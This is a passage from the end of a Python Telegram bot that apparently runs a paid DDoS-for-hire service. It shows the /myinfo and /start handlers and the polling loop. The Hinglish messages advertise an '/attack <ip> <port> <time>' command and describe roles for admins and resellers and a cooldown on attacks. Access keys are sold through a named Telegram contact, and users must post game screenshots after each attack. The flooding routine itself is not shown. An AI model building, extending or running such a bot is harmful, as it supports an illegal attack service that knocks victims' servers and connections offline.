    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    role = "User"
    if is_overlord(user_id, username):
        role = "Overlord"
    elif is_admin(user_id, username):
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"

    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ COSMIC PROFILE ⚡️*\n\n"
        f"*STATUS*: Yeh hai tera cosmic ID, bhai!\n\n"
        f"👤 *User ID*: {user_id}\n"
        f"🎭 *Username*: @{username or 'None'}\n"
        f"👑 *Role*: {role}\n"
    )

    if user_id in resellers:
        response += f"💰 *Reseller Balance*: {resellers[user_id]} Rs\n"

    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            status = "Active" if datetime.datetime.now(IST) < exp_date else "Expired"
            response += (
                f"🔑 *Access Status*: {status}\n"
                f"⏳ *Expires on*: {exp_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                f"🌐 *Context*: {user_info['context'].capitalize()}\n"
            )
        except (ValueError, KeyError):
            response += f"🔑 *Access Status*: Invalid Data\n"
    else:
        response += f"🔑 *Access Status*: No Active Key\n"

    if user_id in last_attack_time:
        elapsed = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if elapsed < COOLDOWN_PERIOD:
            remaining = int(COOLDOWN_PERIOD - elapsed)
            response += f"⏳ *Attack Cooldown*: {remaining} seconds remaining\n"
        else:
            response += f"⏳ *Attack Cooldown*: Ready\n"
    else:
        response += f"⏳ *Attack Cooldown*: Ready\n"

    response += (
        f"\n*COSMIC INSIGHT*: Tu cosmic universe ka hissa hai, apna power smartly use kar! 💥\n"
        f"*COSMIC COMMAND*: /help dekh available commands ke liye! 🚀\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", "", response)

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["start"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ WELCOME TO COSMIC DDOS COMMAND CENTER ⚡️*\n\n"
        f"*STATUS*: Bot shuru ho gaya, bhai! 🚀\n\n"
        f"*VAULT ACCESS:*\n"
        f"🔑 Yeh bot tujhe cosmic power deta hai, par pehle key chahiye!\n"
        f"✅ *Key kaise milegi?* @Rahul_618 se contact kar ya trusted reseller se le.\n\n"
        f"*COSMIC INSIGHT:*\n"
        f"💥 *Attack Power*: IP aur port pe attack launch kar sakta hai.\n"
        f"📸 *Feedback Zaroori*: Group mein attack ke baad BGMI screenshot compulsory hai.\n"
        f"🚫 *No Scams*: Sirf @Rahul_618 se key le, warna scam ho sakta hai!\n\n"
        f"*COSMIC COMMANDS:*\n"
        f"📋 /help - Sari commands ki list\n"
        f"ℹ️ /myinfo - Apna status check kar\n"
        f"🔓 /redeem <key> - Key activate kar\n"
        f"💥 /attack <ip> <port> <time> - Attack launch kar (key ke baad)\n\n"
        f"*JOIN KAR*: https://t.me/devil_ddos\n"
        f"*COSMIC COMMAND*: /help ya /myinfo try kar abhi! 🚀\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/start", "", response)

# Initialize and start the bot
if __name__ == "__main__":
    load_data()
    print("Bot is starting...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0)
        except Exception as e:
            log_error(f"Bot polling error: {str(e)}", "system", "system")
            print(f"Polling error: {str(e)}. Retrying in 5 seconds...")
            time.sleep(5)